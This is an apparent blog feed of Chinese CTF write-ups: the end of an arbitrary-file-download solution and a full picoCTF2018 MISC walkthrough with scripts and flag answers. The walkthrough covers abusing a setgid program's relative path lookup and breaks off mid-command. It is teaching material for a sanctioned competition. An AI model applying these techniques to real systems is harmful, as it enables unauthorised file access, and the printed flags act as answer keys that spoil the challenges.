class="comment">// filename=35hGm34y.php</span></span><br></pre></td></tr></table></figure><p>我们得到了任意文件下载权限！ 于是我把所有已知文件名的文件全下载下来了, 没有找到flag. 但我很快想到了应该不会藏在太刁钻的地方, 于是用我试了下<code>/flag</code>这个路径, 果然, 拿到了flag. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;69639776-2e53-45ab-8664-deb8941ab4c5&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;很开心，我这个菜鸡竟然可以开始做pwn题了，发个wp纪念下。 （虽然是很简单的&lt;/p&gt;
&lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.lol
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://lxzmads.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>picoCTF2018 MISC全部题解</title>
    <link href="http://lxzmads.github.io/2018/10/18/picoCTF2018%20MISC%E5%85%A8%E9%83%A8%E9%A2%98%E8%A7%A3/"/>
    <id>http://lxzmads.github.io/2018/10/18/picoCTF2018 MISC全部题解/</id>
    <published>2018-10-17T16:00:00.000Z</published>
    <updated>2019-02-17T08:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>首发于<a href="https://xz.aliyun.com/t/2926" target="_blank" rel="noopener">先知社区</a></em></p><p>picoCTF的题目分布由易到难，很适合新手入门，做题过程中可以学到东西。对于新手，我觉得misc题更是能引起学习兴趣的。于是我做完了picoCTF2018的misc题目，现在把Writeup发到网络上来供萌新学习。所有题目文件和解析脚本可以从<a href="https://github.com/lxzmads/my-ctf-vestige/tree/master/picoctf2018/misc_KO" target="_blank" rel="noopener">这里</a>找到.</p><h1 id="General-Warmup-1-150pts"><a href="#General-Warmup-1-150pts" class="headerlink" title="General Warmup 1 (150pts)"></a>General Warmup 1 (150pts)</h1><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>If I told you your grade was 0x41 in hexadecimal, what would it be in ASCII? </p><blockquote><p>Hints:<br>(1) Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p></blockquote><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>题目意思很明确, 并且告诉你这就是ASCII, 于是Google ASCII, 对照ASCII码表就可以解出来了。还可以用Python来解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'picoCTF&#123;'</span>+chr(<span class="string">'0x41'</span>)+<span class="string">'&#125;'</span></span><br><span class="line"><span class="comment"># picoCTF&#123;A&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="General-Warmup-2-50pts"><a href="#General-Warmup-2-50pts" class="headerlink" title="General Warmup 2 (50pts)"></a>General Warmup 2 (50pts)</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>Can you convert the number 27 (base 10) to binary (base 2)? </p><blockquote><p>Hints:<br>(1) Submit your answer in our competition’s flag format. For example, if you answer was ‘11111’, you would submit ‘picoCTF{11111}’ as the flag.</p></blockquote><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><p>进制转换, 没什么多说的.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'picoCTF&#123;'</span>+bin(<span class="number">27</span>)[<span class="number">2</span>:]+<span class="string">'&#125;'</span></span><br><span class="line"><span class="comment"># picoCTF&#123;11011&#125;</span></span><br></pre></td></tr></table></figure><h1 id="General-Warmup-3-50pts"><a href="#General-Warmup-3-50pts" class="headerlink" title="General Warmup 3 (50pts)"></a>General Warmup 3 (50pts)</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>What is 0x3D (base 16) in decimal (base 10).</p><blockquote><p>Hints:<br>(1) Submit your answer in our competition’s flag format. For example, if you answer was ‘22’, you would submit ‘picoCTF{22}’ as the flag.</p></blockquote><h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2><p>进制转换.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'picoCTF&#123;'</span>+int(<span class="string">'0x3D'</span>, <span class="number">16</span>)+<span class="string">'&#125;'</span></span><br><span class="line"><span class="comment"># picoCTF&#123;61&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Resources-50pts"><a href="#Resources-50pts" class="headerlink" title="Resources (50pts)"></a>Resources (50pts)</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>We put together a bunch of resources to help you out on our website! If you go over there, you might even find a flag! [link [1]] (<a href="https://picoctf.com/resources" target="_blank" rel="noopener">https://picoctf.com/resources</a> )</p><h2 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h2><p>就是观看一些介绍, 在网页中<code>Ctrl+F</code>搜索<code>picoCTF</code>, 得到flag. 也可用脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re </span><br><span class="line">r = requests.get(<span class="string">'https://picoctf.com/resources'</span>)</span><br><span class="line"><span class="keyword">print</span> re.findall(<span class="string">r'(picoCTF\&#123;.*\&#125;)'</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># picoCTF&#123;xiexie_ni_lai_zheli&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="grep-1-75pts"><a href="#grep-1-75pts" class="headerlink" title="grep 1 (75pts)"></a>grep 1 (75pts)</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>Can you find the flag in <a href="https://2018shell2.picoctf.com/static/805ac70722810caa0b1c02bc88ef68d8/file" target="_blank" rel="noopener">file [1]</a> ? This would be really obnoxious to look through by hand, see if you can find a faster way. You can also find the file in /problems/grep-1_0_c0c0c16438cdbee39591397e16389f59 on the shell server.</p><blockquote><p>Hints:<br>grep <a href="https://ryanstutorials.net/linuxtutorial/grep.php" target="_blank" rel="noopener">tutorial</a></p></blockquote><h2 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h2><p>从类似这些题就可以看出, Hints给的非常充分, 你只需要具备学习能力就能做题, 而不需要足够的知识储备与脑洞能力. 这和国内的题目差别是很明显的.</p><p>直接利用sh脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat file | grep picoCTF</span><br><span class="line"><span class="comment"># picoCTF&#123;grep_and_you_will_find_52e63a9f&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="net-cat-75pts"><a href="#net-cat-75pts" class="headerlink" title="net cat (75pts)"></a>net cat (75pts)</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>Using netcat (nc) will be a necessity throughout your adventure. Can you connect to <code>2018shell2.picoctf.com</code> at port <code>36356</code> to get the flag?</p><blockquote><p>Hints:<br>nc <a href="https://linux.die.net/man/1/nc" target="_blank" rel="noopener">tutorial</a></p></blockquote><h2 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h2><p>主要是学习nc的用法. 连上之后就可以看到flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 2018shell2.picoctf.com 36356</span><br></pre></td></tr></table></figure><h1 id="strings-100pts"><a href="#strings-100pts" class="headerlink" title="strings (100pts)"></a>strings (100pts)</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>Can you find the flag in this file [1]  without actually running it? You can also find the file in /problems/strings_4_40d221755b4a0b134c2a7a2e825ef95f on the shell server.</p><blockquote><p>Hints:<br><a href="https://linux.die.net/man/1/strings" target="_blank" rel="noopener">strings</a></p></blockquote><h2 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h2><p>主要是熟悉linux下的<code>strings</code>工具<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings strings|grep pico</span><br><span class="line"><span class="comment"># picoCTF&#123;sTrIngS_sAVeS_Time_d3ffa29c&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="pipe-110pts"><a href="#pipe-110pts" class="headerlink" title="pipe (110pts)"></a>pipe (110pts)</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>During your adventure, you will likely encounter a situation where you need to process data that you receive over the network rather than through a file. Can you find a way to save the output from this program and search for the flag? Connect with 2018shell2.picoctf.com 2015.</p><blockquote><p>Hints:<br>(1) Remember the flag format is picoCTF{XXXX} (2) Ever heard of a pipe? No not that kind of pipe… This <a href="http://www.linfo.org/pipes.html" target="_blank" rel="noopener">kind [1]</a></p></blockquote><h2 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h2><p>熟悉linux里面管道的原理以及操作<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 2018shell2.picoctf.com 2015 | grep pico</span><br><span class="line"><span class="comment"># picoCTF&#123;almost_like_mario_8861411c&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="grep-2-125pts"><a href="#grep-2-125pts" class="headerlink" title="grep 2 (125pts)"></a>grep 2 (125pts)</h1><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><p>This one is a little bit harder. Can you find the flag in /problems/grep-2_4_06c2058761f24267033e7ca6ff9d9144/files on the shell server? Remember, grep is your friend.</p><blockquote><p>Hints:<br>grep <a href="https://ryanstutorials.net/linuxtutorial/grep.php" target="_blank" rel="noopener">tutorial</a></p></blockquote><h2 id="题解-8"><a href="#题解-8" class="headerlink" title="题解"></a>题解</h2><p>连上题目服务器, 进入到指定文件夹之后发现有很多的文件夹, flag就藏在某个文件夹的某个文件里面, 查阅grep的文档, 发现<code>-r</code>参数可以递归探测目录. 于是在题目目录运行命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">'pico'</span> -r .</span><br><span class="line"><span class="comment"># ./files2/file3:picoCTF&#123;grep_r_and_you_will_find_036bbb25&#125;</span></span><br></pre></td></tr></table></figure></p><p>得到flag. </p><h1 id="Aca-Shell-A-150pts"><a href="#Aca-Shell-A-150pts" class="headerlink" title="Aca-Shell-A (150pts)"></a>Aca-Shell-A (150pts)</h1><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><p>It’s never a bad idea to brush up on those linux skills or even learn some new ones before you set off on this adventure! Connect with nc 2018shell2.picoctf.com 6903.</p><blockquote><p>Hints:<br>Linux for <a href="https://maker.pro/education/basic-linux-commands-for-beginners" target="_blank" rel="noopener">Beginners</a></p></blockquote><h2 id="题解-9"><a href="#题解-9" class="headerlink" title="题解"></a>题解</h2><p>题目是一个游戏, 主要考察基本linux命令的使用.<br>连上之后首先输出一大段话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sweet! We have gotten access into the system but we aren&apos;t root.</span><br><span class="line">It&apos;s some sort of restricted shell! I can&apos;t see what you are typing</span><br><span class="line">but I can see your output. I&apos;ll be here to help you along.</span><br><span class="line">If you need help, type &quot;echo &apos;Help Me!&apos;&quot; and I&apos;ll see what I can do</span><br><span class="line">There is not much time left!</span><br></pre></td></tr></table></figure></p><p>这是个很有意思的shell, 它可以根据shell的输入来执行命令, 而不是你的输入. 我们<code>echo &#39;Help Me!&#39;</code>来看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You got this! Have you looked for any  directories?</span><br></pre></td></tr></table></figure><p>提示看一下目录, 于是我们<code>ls</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">blackmail</span><br><span class="line">executables</span><br><span class="line">passwords</span><br><span class="line">photos</span><br><span class="line">secret</span><br></pre></td></tr></table></figure></p><p>看到五个目录, 有个<code>secret</code>目录引人注目, <code>cd</code>进入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Now we are cookin&apos;! Take a look around there and tell me what you find!</span><br></pre></td></tr></table></figure></p><p>继续<code>ls</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">intel_1</span><br><span class="line">intel_2</span><br><span class="line">intel_3</span><br><span class="line">intel_4</span><br><span class="line">intel_5</span><br><span class="line">profile_ahqueith5aekongieP4ahzugi</span><br><span class="line">profile_ahShaighaxahMooshuP1johgo</span><br><span class="line">profile_aik4hah9ilie9foru0Phoaph0</span><br><span class="line">profile_AipieG5Ua9aewei5ieSoh7aph</span><br><span class="line">profile_bah9Ech9oa4xaicohphahfaiG</span><br><span class="line">profile_ie7sheiP7su2At2ahw6iRikoe</span><br><span class="line">profile_of0Nee4laith8odaeLachoonu</span><br><span class="line">profile_poh9eij4Choophaweiwev6eev</span><br><span class="line">profile_poo3ipohGohThi9Cohverai7e</span><br><span class="line">profile_Xei2uu5suwangohceedaifohs</span><br><span class="line">Sabatoge them! Get rid of all their intel files!</span><br></pre></td></tr></table></figure></p><p>最后一句告诉我们删掉所有的<code>intel</code>文件, 于是<code>rm intel*</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nice! Once they are all gone, I think I can drop you a file of an exploit!</span><br><span class="line">Just type &quot;echo &apos;Drop it in!&apos; &quot; and we can give it a whirl!</span><br></pre></td></tr></table></figure></p><p>接着按照提示<code>echo &#39;Drop it in!&#39;</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I placed a file in the executables folder as it looks like the only place we can execute from!</span><br><span class="line">Run the script I wrote to have a little more impact on the system!</span><br></pre></td></tr></table></figure></p><p>按照提示<code>cd ..</code>到上层目录, 再进入<code>executables</code>目录, <code>./dontLookHere</code>运行可执行程序, 输出一大堆十六进制, 貌似是为了看起来很牛逼, 最后有一段文字是提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Looking through the text above, I think I have found the password. I am just having trouble with a username.</span><br><span class="line">Oh drats! They are onto us! We could get kicked out soon!</span><br><span class="line">Quick! Print the username to the screen so we can close are backdoor and log into the account directly!</span><br><span class="line">You have to find another way other than echo!</span><br></pre></td></tr></table></figure></p><p>意思就是要输出用户名, 但是<code>echo</code>不能用了, 查阅Linux文档, 发现可以用<code>whoami</code>输出用户名, 于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l33th4x0r</span><br><span class="line">Perfect! One second!</span><br><span class="line">Okay, I think I have got what we are looking for. I just need to to copy the file to a place we can read.</span><br><span class="line">Try copying the file called TopSecret in tmp directory into the passwords folder.</span><br></pre></td></tr></table></figure></p><p>按照提示, <code>cp /tmp/TopSecret ../passwords</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Server shutdown in 10 seconds...</span><br><span class="line">Quick! go read the file before we lose our connection!</span><br></pre></td></tr></table></figure></p><p>最后进入到 <code>passwords</code>目录, <code>cat TopSecret</code>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CrUsHeD_It_dddcec58&#125;</span><br></pre></td></tr></table></figure></p><h1 id="environ-150pts"><a href="#environ-150pts" class="headerlink" title="environ (150pts)"></a>environ (150pts)</h1><h2 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h2><p>Sometimes you have to configure environment variables before executing a program. Can you find the flag we’ve hidden in an environment variable on the shell server?</p><blockquote><p>Hints:<br>unix <a href="https://www.tutorialspoint.com/unix/unix-environment.htm" target="_blank" rel="noopener">env</a></p></blockquote><h2 id="题解-10"><a href="#题解-10" class="headerlink" title="题解"></a>题解</h2><p>主要是熟悉unix下的环境变量. 我们连上题目服务器后, 运行<code>env|grep pico|cut -d &#39;=&#39; -f2</code>, 得到flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mads@pico-2018-shell-2:~$ env|grep pico|cut -d <span class="string">'='</span> -f2</span><br><span class="line">picoCTF&#123;eNv1r0nM3nT_v4r14Bl3_fL4g_3758492&#125;</span><br></pre></td></tr></table></figure></p><h1 id="ssh-keyz-150pts"><a href="#ssh-keyz-150pts" class="headerlink" title="ssh-keyz (150pts)"></a>ssh-keyz (150pts)</h1><h2 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h2><p>As nice as it is to use our webshell, sometimes its helpful to connect directly to our machine. To do so, please add your own public key to ~/.ssh/authorized_keys, using the webshell. The flag is in the ssh banner which will be displayed when you login remotely with ssh to  with your username.</p><blockquote><p>Hints:<br>key generation <a href="https://confluence.atlassian.com/bitbucketserver/creating-ssh-keys-776639788.html" target="_blank" rel="noopener">tutorial</a><br>We also have an expert demonstrator to help you along.<a href="https://www.youtube.com/watch?v=3CN65ccfllU&amp;list=PLJ_vkrXdcgH-lYlRV8O-kef2zWvoy79yP&amp;index=4" target="_blank" rel="noopener">link</a></p></blockquote><h2 id="题解-11"><a href="#题解-11" class="headerlink" title="题解"></a>题解</h2><p>基本的用私钥登录服务器的教程, 按照教程一步步做, 连上服务器就能看到flag.</p><p>一键脚本:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh mads@2018shell2.picoctf.com <span class="string">'exit'</span>|grep pico</span><br><span class="line"><span class="comment"># picoCTF&#123;who_n33ds_p4ssw0rds_38dj21&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="what-base-is-this-200pts"><a href="#what-base-is-this-200pts" class="headerlink" title="what base is this? (200pts)"></a>what base is this? (200pts)</h1><h2 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h2><p>To be successful on your mission, you must be able read data represented in different ways, such as hexadecimal or binary. Can you get the flag from this program to prove you are ready? Connect with <code>nc 2018shell2.picoctf.com 15853</code>.</p><blockquote><p>Hints:<br>(1) I hear python is a good means (among many) to convert things. (2) It might help to have multiple windows open</p></blockquote><h2 id="题解-12"><a href="#题解-12" class="headerlink" title="题解"></a>题解</h2><p>连上之后就是给一系列的不同进制的数据, 然后按要求转换之后给答案. 我们可以用python的<a href="http://docs.pwntools.com/en/stable/" target="_blank" rel="noopener">pwntools</a>库与程序交互, <code>re</code>模块完成字符串查找, python 本身进行进制转换, 给出一键脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">context.log_level = <span class="string">'error'</span></span><br><span class="line">sh = remote(<span class="string">'2018shell2.picoctf.com'</span>, <span class="number">15853</span>)</span><br><span class="line">msg1 = sh.recv()</span><br><span class="line">t1 = re.findall(<span class="string">'([01]&#123;8&#125;)'</span>, msg1)</span><br><span class="line">t1 = <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr(int(x,<span class="number">2</span>)), t1))</span><br><span class="line">sh.sendline(t1)</span><br><span class="line">msg2 = sh.recv()</span><br><span class="line">t2 = re.findall(<span class="string">'([0-9a-f]&#123;8,&#125;)'</span>, msg2)</span><br><span class="line">sh.sendline(t2[<span class="number">0</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">msg3 = sh.recv()</span><br><span class="line">t3 = re.findall(<span class="string">"(\d&#123;3&#125;)"</span>, msg3)</span><br><span class="line">t3 = <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr(int(x, <span class="number">8</span>)), t3))</span><br><span class="line">sh.sendline(t3)</span><br><span class="line"><span class="keyword">print</span> re.findall(<span class="string">'(picoCTF&#123;.*&#125;)'</span>, sh.recv())[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># picoCTF&#123;delusions_about_finding_values_3cc386de&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="you-can’t-see-me-200pts"><a href="#you-can’t-see-me-200pts" class="headerlink" title="you can’t see me (200pts)"></a>you can’t see me (200pts)</h1><h2 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h2><p>‘…reading transmission… Y.O.U. .C.A.N.’.T. .S.E.E. .M.E.  …transmission ended…’ Maybe something lies in /problems/you-can-t-see-me_3_1a39ec6c80b3f3a18610074f68acfe69.</p><blockquote><p>Hints:<br>(1) What command can see/read files? (2) What’s in the manual page of ls?</p></blockquote><h2 id="题解-13"><a href="#题解-13" class="headerlink" title="题解"></a>题解</h2><p>进入到目录之后, <code>ls -al</code>发现有隐藏文件<code>.</code>, 其实后面还有两个空白字符, 在服务器上可以用<code>tab</code>键补全就可以查看到了, 这里给个一键脚本:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -q mads@2018shell2.picoctf.com <span class="string">"cat  /problems/you-can-t-see-me_3_1a39ec6c80b3f3a18610074f68acfe69/.\ \ "</span></span><br></pre></td></tr></table></figure></p><h1 id="absolutely-relative-250pts"><a href="#absolutely-relative-250pts" class="headerlink" title="absolutely relative (250pts)"></a>absolutely relative (250pts)</h1><h2 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h2><p>In a filesystem, everything is relative ¯_(ツ)_/¯. Can you find a way to get a flag from this <a href="https://2018shell2.picoctf.com/static/94e0cff2fa6fb11f5c85edccb8144415/absolutely-relative" target="_blank" rel="noopener">program [1]</a> ? You can find it in /problems/absolutely-relative_4_bef88c36784b44d2585bb4d2dbe074bd on the shell server. <a href="https://2018shell2.picoctf.com/static/94e0cff2fa6fb11f5c85edccb8144415/absolutely-relative.c" target="_blank" rel="noopener">Source [2]</a> .</p><blockquote><p>Hints:<br>(1) Do you have to run the program in the same directory? (⊙.☉)7 (2) Ever used a text editor? Check out the program ‘nano’</p></blockquote><h2 id="题解-14"><a href="#题解-14" class="headerlink" title="题解"></a>题解</h2><p>给了C源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> yes_len 3</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *yes = <span class="string">"yes"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">99</span>];</span><br><span class="line">    <span class="keyword">char</span> permission[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE * file;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">"/problems/absolutely-relative_4_bef88c36784b44d2585bb4d2dbe074bd/flag.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, flag)!=EOF)</span><br><span class="line">    fclose(file);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    file = fopen( <span class="string">"./permission.txt"</span> , <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(file, <span class="string">"%s"</span>, permission);</span><br><span class="line">        &#125;</span><br><span class="line">        permission[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(permission, yes, yes_len)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You have the write permissions.\n%s\n"</span>, flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You do not have sufficient permissions to view the flag.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序大概就是先从一个文件读取flag, 然后再读取一个<code>permission.txt</code>文件前五个字符, 再判断读取到的permission的前三个字符是否为<code>yes</code>, 是的话输出flag, 不是的话提示权限不足.</p><p>我们进入服务器上题目文件夹下, <code>ls -al</code>查看文件权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">total 76</span><br><span class="line">drwxr-xr-x   2 root       root                   4096 Sep 28 07:42 .</span><br><span class="line">drwxr-x--x 576 root       root                  53248 Sep 30 03:50 ..</span><br><span class="line">-rwxr-sr-x   1 hacksports absolutely-relative_4  8984 Sep 28 07:42 absolutely-relative</span><br><span class="line">-rw-rw-r--   1 hacksports hacksports              796 Sep 28 07:42 absolutely-relative.c</span><br><span class="line">-r--r-----   1 hacksports absolutely-relative_4    37 Sep 28 07:42 flag.txt</span><br></pre></td></tr></table></figure></p><p>发现没有<code>permission.txt</code>文件, 并且flag文件也没法读. 根据题目提示<code>absolutely relative</code>以及注意到源码中读取<code>permission.txt</code>是通过相对路径读取的, 于是我们可以伪造<code>permission.txt</code>.</p><p>我们首先进入家目录, 把源程序拷贝过来, 创建<code>permission.txt</code>并写入<code>yes</code>, 运行<code>./absolutely-relative</code>,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have the write permissions.</span><br></pre></td></tr></table></figure></p><p>发现过了permission的判断, 但是并没有打印出flag, 我们看下权限<code>ls -al</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr-x    1 mads mads   8984 Sep 28 07:42 absolutely-relative</span><br></pre></td></tr></table></figure></p><p>发现<code>cp</code>过来之后ownership变成了自己, 当然是读不了<code>flag</code>. 由于这里权限不足, 就算<code>cp -p</code>也是不行的. 但是可以用软链接的形式将源程序链接到家目录, <code>ln -s 